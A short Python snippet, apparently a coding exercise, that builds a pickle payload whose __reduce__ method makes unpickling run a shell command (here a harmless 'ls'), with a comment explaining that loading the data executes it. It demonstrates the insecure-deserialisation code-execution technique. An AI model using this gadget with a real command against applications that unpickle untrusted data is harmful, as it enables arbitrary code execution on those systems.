import pickle

class Payload(object):
    def __reduce__(self):
        return exec, ('import os;os.system("ls")',)

def makePickleData(payload: Payload):
    '''
    Get serialized data from the payload object and serialize it before returning it
    '''
    return pickle.dumps(payload)

# Example usage
payload = Payload()
serialized_data = makePickleData(payload)

# Note: Deserializing this data will execute the code in the __reduce__ method
# deserialized_data = pickle.loads(serialized_data)